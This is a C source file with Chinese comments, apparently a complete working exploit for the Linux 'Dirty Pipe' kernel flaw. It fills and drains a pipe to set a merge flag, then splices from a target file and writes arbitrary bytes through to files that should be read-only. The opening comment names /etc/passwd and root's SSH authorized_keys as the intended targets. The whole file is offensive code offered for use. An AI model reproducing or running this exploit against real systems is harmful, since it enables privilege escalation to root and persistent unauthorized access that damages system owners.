// dirtypipe.c —— 覆写只读文件（改 /etc/passwd 或 /root/.ssh/authorized_keys）
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "用法: %s <目标文件> <偏移> <内容>\n", argv[0]);
        return 1;
    }
    const char *path = argv[1];
    loff_t offset = atoll(argv[2]);
    const char *data = argv[3];
    size_t len = strlen(data);

    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    // 1) 用 0 填充管道，设置 PIPE_BUF_FLAG_CAN_MERGE
    int p[2];
    if (pipe(p)) { perror("pipe"); return 1; }
    unsigned int pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    char *buf = malloc(pipe_size);
    memset(buf, 'A', pipe_size);
    for (unsigned int r = pipe_size; r > 0;) {
        ssize_t n = write(p[1], buf, r);
        if (n < 0) { perror("write"); return 1; }
        r -= n;
    }
    for (unsigned int r = pipe_size; r > 0;) {
        ssize_t n = read(p[0], buf, r);
        if (n < 0) { perror("read"); return 1; }
        r -= n;
    }

    // 2) splice 一个字节, 偏移 offset-1, 使目标页进入可 merge 状态
    --offset;
    loff_t off = offset;
    if (splice(fd, &off, p[1], NULL, 1, 0) < 0) { perror("splice"); return 1; }

    // 3) 写入任意数据 —— 内核漏洞直接写穿只读文件
    if (write(p[1], data, len) < 0) { perror("write"); return 1; }

    free(buf);
    close(fd);
    return 0;
}
